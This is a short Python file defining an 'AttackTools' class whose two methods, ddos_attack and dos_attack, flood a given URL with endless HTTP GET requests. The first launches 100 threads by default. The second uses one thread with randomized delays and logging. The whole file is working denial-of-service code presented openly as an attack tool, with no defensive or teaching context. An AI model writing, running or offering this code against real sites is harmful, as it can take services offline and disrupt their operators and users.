import requests
import threading
import time
import logging
import random

class AttackTools:
    @staticmethod
    def ddos_attack(url, threads=100):
        def attack():
            while True:
                try:
                    requests.get(url)
                    print(f"Sent request to {url}")
                except requests.RequestException as e:
                    print(f"Error: {e}")

        print(f"Starting DDoS attack on {url} with {threads} threads")
        for _ in range(threads):
            thread = threading.Thread(target=attack)
            thread.start()

    @staticmethod
    def dos_attack(url, rate_limit=10, delay_range=(1, 3)):
        def attack():
            while True:
                try:
                    response = requests.get(url)
                    print(f"Sent request to {url} - Status code: {response.status_code}")
                    logging.info(f"Sent request to {url} - Status code: {response.status_code}")
                    time.sleep(random.uniform(*delay_range))
                except requests.RequestException as e:
                    print(f"Error: {e}")
                    logging.error(f"Error: {e}")
                time.sleep(rate_limit)

        print(f"Starting DoS attack on {url} with rate limit {rate_limit} seconds and random delay between {delay_range[0]} to {delay_range[1]} seconds")
        logging.info(f"Starting DoS attack on {url} with rate limit {rate_limit} seconds and random delay between {delay_range[0]} to {delay_range[1]} seconds")
        attack_thread = threading.Thread(target=attack)
        attack_thread.start()
